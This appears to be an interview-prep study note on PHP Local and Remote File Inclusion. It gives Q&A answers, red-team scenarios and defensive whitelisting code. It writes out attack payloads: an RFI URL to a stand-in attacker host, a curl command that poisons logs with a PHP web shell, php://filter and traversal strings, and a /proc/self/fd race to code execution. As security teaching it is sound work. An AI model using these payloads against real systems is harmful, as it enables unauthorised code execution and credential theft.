---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 07"
---

# Local and Remote File Inclusion (LFI/RFI) Interview Guide

## Formal Technical Questions

### Q1: Differentiate between Local File Inclusion (LFI), Remote File Inclusion (RFI), and Directory Traversal. Provide technical context for each.
**Answer:**
While heavily related, these vulnerabilities possess distinct execution mechanisms and impacts:
- **Directory Traversal (Path Traversal):** This vulnerability allows an attacker to read arbitrary files on the server that is running an application. The application takes user input to construct a file path and reads the file's contents without sanitization (e.g., `file_get_contents($_GET['file'])`). The impact is strictly information disclosure.
- **Local File Inclusion (LFI):** LFI occurs when an application includes a file as executable code based on user input (e.g., `include($_GET['page'])` in PHP). If an attacker can point the inclusion function to a local file containing malicious code (like an Apache access log they have poisoned with PHP code), the server will execute that code. LFI implies both information disclosure and potential Remote Code Execution (RCE).
- **Remote File Inclusion (RFI):** RFI is similar to LFI, but the vulnerability allows the inclusion of remote files hosted by the attacker. This relies on the target server's configuration allowing external URL wrappers (e.g., `allow_url_include = On` in PHP). The attacker hosts a malicious script (e.g., `http://attacker.com/shell.php`) and passes this URL to the vulnerable parameter, resulting in direct RCE.

### Q2: Explain the significance of PHP wrappers in exploiting LFI vulnerabilities. Detail the functionality of `php://filter` and `php://input`.
**Answer:**
PHP wrappers are stream handlers that dictate how PHP interacts with various data sources. They are paramount in LFI exploitation for bypassing filters and achieving code execution.
- **`php://filter`:** This wrapper allows attackers to apply various filters to a data stream before it's read by the application. Its most common use in LFI is to base64-encode PHP source files. If an attacker uses `?page=config.php`, the PHP engine executes it, returning blank output. But using `?page=php://filter/read=convert.base64-encode/resource=config.php` forces the server to base64-encode the source code *before* inclusion, preventing execution and allowing the attacker to read the raw database credentials.
- **`php://input`:** This wrapper reads raw data from the HTTP request body. If the application is vulnerable to LFI and `allow_url_include` is enabled, an attacker can set the parameter to `?page=php://input` and place malicious PHP code in the body of a POST request. The server will include and execute the POST body contents directly.

### Q3: Describe the process of achieving Remote Code Execution via LFI using Log Poisoning. What are the common target logs?
**Answer:**
Log poisoning is an LFI-to-RCE technique where an attacker injects executable code into a log file, and then uses the LFI vulnerability to include that log file, forcing the server to execute the injected code.
1. **Injection:** The attacker interacts with the service to write a payload into the logs. For example, they might use `curl -A "<?php system($_GET['cmd']); ?>" http://target.com`. The web server logs the User-Agent string into `access.log`.
2. **Inclusion:** The attacker navigates to the vulnerable LFI parameter and traverses to the log file: `?page=../../../../../var/log/apache2/access.log&cmd=id`.
3. **Execution:** The PHP `include()` function parses the log file. It treats standard log text as HTML but executes the injected PHP tags, running the `system('id')` command.
**Common Target Logs:**
- Apache/Nginx Access/Error logs (`/var/log/apache2/access.log`, `/var/log/nginx/error.log`)
- SSH Auth logs (`/var/log/auth.log`) - Poisoned by attempting to log in with a username containing the PHP payload.
- SMTP/Mail logs (`/var/log/mail.log`) - Poisoned by sending an email with a malicious subject or sender address.

### Q4: How does LFI exploitation differ between Linux and Windows environments regarding path syntax and file targets?
**Answer:**
- **Path Syntax:** Linux uses forward slashes (`/`) and root directories. Windows uses drive letters (`C:\`) and backslashes (`\`). However, Windows web servers often accept forward slashes in web requests, making `../../` universally applicable.
- **Null Byte Bypasses:** In older PHP versions (< 5.3.4), an attacker could use a null byte (`%00`) to truncate hardcoded extensions (e.g., `include($_GET['file'] . ".php");` bypassed with `?file=../../../../etc/passwd%00`). This is applicable to both OSs but relies on the underlying C language string termination.
- **Target Files:**
  - **Linux:** ` /etc/passwd` (users), `/proc/self/environ` (environment variables, often exploitable for RCE if User-Agent is logged here), `/etc/shadow` (requires root).
  - **Windows:** `C:\Windows\System32\drivers\etc\hosts` (network config), `C:\Windows\win.ini` (system info), `C:\inetpub\logs\LogFiles\` (IIS logs for poisoning).

## Scenario-Based Questions

### Q1: You are on a Red Team engagement. You find an LFI vulnerability but the server prevents path traversal sequences (`../`) and you cannot append null bytes. The application uses `include($_GET['module'] . ".php");`. How do you read `config.php` located in the same directory?
**Answer:**
Because I cannot use `../` to break out, and a `.php` extension is rigidly appended, I must rely on PHP wrappers that operate on files without needing directory traversal.
Since the target file `config.php` has a `.php` extension, the appended extension will result in `config.php.php`, which doesn't exist.
However, I can use the `php://filter` wrapper. The payload would be:
`?module=php://filter/read=convert.base64-encode/resource=config`
The application logic appends `.php`, making the final evaluated inclusion:
`include('php://filter/read=convert.base64-encode/resource=config.php');`
This perfectly constructs a valid wrapper URI. The server will read `config.php`, base64-encode it, and return it to me, bypassing both the traversal filter and utilizing the hardcoded extension to my advantage.

### Q2: You have LFI on a modern Linux server. `allow_url_include` is OFF. You cannot write to any log files due to strict permissions. PHP file uploads are completely disabled. How can you escalate this LFI to RCE using PHP sessions?
**Answer:**
I would utilize PHP Session Poisoning.
1. **Identify Session Mechanism:** PHP often stores session data in files located at `/var/lib/php/sessions/sess_<SESSION_ID>` or `/tmp/sess_<SESSION_ID>`.
2. **Inject Payload into Session:** I need to find a part of the application that stores user input into the session variable. For example, a "Set User Preference" feature or a "Profile Name" update. I will update my profile name to `<?php system($_GET['cmd']); ?>`.
3. **Verify Injection:** The application serializes this data and writes it to my session file on the disk.
4. **Include the Session File:** I grab my `PHPSESSID` cookie value (e.g., `ab12cd34`). I then use the LFI vulnerability to include the session file:
   `?page=../../../../../var/lib/php/sessions/sess_ab12cd34&cmd=whoami`
5. **Execution:** The server includes the session file, parses the serialized data, hits the PHP tags I injected, and executes the OS command.

## Deep-Dive Defensive Questions

### Q1: Your development team is building a dynamic templating system that needs to include files based on the `lang` parameter in the URL. How do you implement this securely, preventing both Path Traversal and LFI?
**Answer:**
A robust defense requires a multi-layered approach prioritizing whitelisting over blacklisting.
1. **Strict Whitelisting:** Define an explicit array or dictionary of permitted files or language codes.
   ```php
   $allowed_langs = ['en' => 'en_lang.php', 'es' => 'es_lang.php', 'fr' => 'fr_lang.php'];
   $user_lang = $_GET['lang'];
   
   if (array_key_exists($user_lang, $allowed_langs)) {
       include("/secure/path/to/includes/" . $allowed_langs[$user_lang]);
   } else {
       include("/secure/path/to/includes/en_lang.php"); // Fallback
   }
   ```
2. **Avoid Direct Input Integration:** Never use the user input directly in the file path construction. The mapping above maps an arbitrary string (`en`) to the actual file (`en_lang.php`).
3. **Path Canonicalization:** If dynamic paths are absolutely necessary, use functions like `realpath()` and `basename()` in PHP to resolve the absolute path and ensure it resides strictly within the intended base directory.
4. **Harden Configuration:** Ensure `allow_url_fopen` and `allow_url_include` are set to `Off` in `php.ini`.

### Q2: An application uses `basename($_GET['file'])` before reading a file to prevent Directory Traversal. Can this be bypassed?
**Answer:**
`basename()` is highly effective against Directory Traversal because it extracts the trailing name component of a path, neutralizing `../../` sequences. For example, `basename("../../../etc/passwd")` returns `passwd`.
However, it **cannot** prevent LFI if the vulnerability lies in including files from the *current* directory.
If the application does `include(basename($_GET['file']));`, an attacker cannot traverse to `/etc/passwd`. But, if the attacker can upload a malicious file named `shell.jpg` to the same directory as the vulnerable script, they can simply use `?file=shell.jpg`. `basename()` will pass `shell.jpg` unmodified, and the `include()` will execute it. `basename()` prevents traversal, but does not validate the file type or its safety.

## Real-World Attack Scenario

### LFI to RCE via File Descriptor Exploitation (`/proc/self/fd`)
During an assessment, the attacker encounters an LFI vulnerability on a Linux machine running Apache and PHP. The server is heavily hardened: log files are unreadable, sessions are stored in memory (Redis), and wrappers are restricted.

1. **Reconnaissance:** The attacker confirms LFI by reading `/etc/passwd`.
2. **The Bottleneck:** The attacker needs a way to upload code. They notice the application has a benign image upload feature, but uploaded images are heavily processed, stripped of metadata, and stored on an external S3 bucket, preventing direct execution.
3. **The Race Condition Strategy:** The attacker decides to use PHP's temporary file upload mechanism. When a file is uploaded to a PHP script, PHP temporarily stores it in `/tmp/phpXXXXXX` before the application logic even begins.
4. **Execution:**
   - The attacker scripts an aggressive loop to continuously upload a large payload containing `<?php system('id'); ?>`.
   - Concurrently, the attacker sends requests to the LFI parameter aiming at the file descriptors of the Apache worker process handling the upload: `/proc/self/fd/X`.
   - On Linux, `/proc/self/fd/` contains symlinks to all files currently opened by the process. If Apache is currently processing the file upload, one of those file descriptors (e.g., `/proc/self/fd/14`) will point to the temporary `/tmp/phpXXXXXX` file.
5. **Exploitation:** By brute-forcing the LFI parameter to `?page=../../../../../../proc/self/fd/14`, the attacker eventually hits the file descriptor exactly when the payload is written to the temporary file but before PHP deletes it. The payload executes, granting RCE.

```text
  [Attacker] 
      |  1. POST malicious file continuously (Payload: <?php id ?>)
      v
  [Web Server] ---> Spawns /tmp/phpA1b2c3 (Deleted in ms)
      |  
      |  2. Parallel LFI GET Request
      v
  [PHP include($_GET['page'])] ---> ?page=../../../../proc/self/fd/14
                                          |
                                    [Symlink resolved] -> /tmp/phpA1b2c3
                                          |
  [Attacker] <---- 3. Execution Result (uid=33(www-data))
```

## Chaining Opportunities
- Chaining with **File Uploads** to execute malicious code stored in seemingly benign file types (e.g., executing a `.jpg` containing PHP code).
- Chaining with **Cross-Site Scripting (XSS)** by reading application source code to uncover hidden XSS vectors or bypassing CSRF protections.
- Chaining with **Path Traversal** to steal sensitive keys (e.g., `id_rsa`, `.env` files) to pivot to other systems.

## Related Notes
- [[11 - Server-Side Request Forgery SSRF]]
- [[24 - Web Shells and Evasion]]
- [[18 - Linux Privilege Escalation Paths]]
